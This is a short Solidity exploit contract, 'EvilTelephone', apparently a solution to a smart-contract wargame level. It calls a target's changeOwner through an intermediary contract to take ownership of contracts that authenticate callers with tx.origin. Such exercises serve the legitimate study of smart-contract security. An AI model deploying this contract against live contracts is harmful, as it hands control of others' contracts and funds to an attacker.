// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Victim {
    function changeOwner(address _owner) external;
    function owner() external returns (address);
}

contract EvilTelephone {
    address public victimAddr;

    function setVictimAddress(address _victimAddr) public {
        victimAddr = _victimAddr;
    }

    function evilOwner(address _newEvilOwner) public {
        Victim(victimAddr).changeOwner(_newEvilOwner);
    }
}